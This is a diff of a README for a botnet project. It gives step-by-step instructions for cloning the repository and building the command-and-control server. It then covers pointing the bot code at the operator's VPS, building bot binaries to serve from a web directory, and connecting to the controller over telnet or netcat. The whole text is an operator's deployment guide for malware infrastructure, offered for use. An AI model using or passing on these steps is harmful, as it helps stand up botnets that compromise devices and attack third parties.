@@ -1,19 +1,14 @@
-# How to compile cnc?
-- Run this:
+# Steps:
+- git clone https://github.com/NoSpacesFlies/Botnet/
+- cd Botnet
+- Edit users in database/logins.txt
+- sh buildcnc.sh
+- screen ./server <botport> <threads> <cncport>
+# Bot steps
+- Edit main.c in /bot to your bot port and vps ip
+- sh legacybotbuilder.sh
 
--------------------------
-sh buildcnc.sh
--------------------------
-
-- And run with
-
--------------------------
-screen ./server <botport> <threads> <cncport>
--------------------------
-
-
-# How to compile and run bot
-- You should change change ip in bot/main.c to your vps ip and bot port screened already
-- Run: sh legacybotbuilder.sh and bins will be put into /var/www/html
-- Payload: You make it :v
-- USE ON UBUNTU ONLY OR FIND ANOTHER COMPILER!!!!!!!!
+# Connecting
+- Putty raw using vps ip + cnc port
+- OR Unix telnet or netcat command using vps ip + cnc port
+- OR Termux telnet or netcat command using vps ip + cnc port
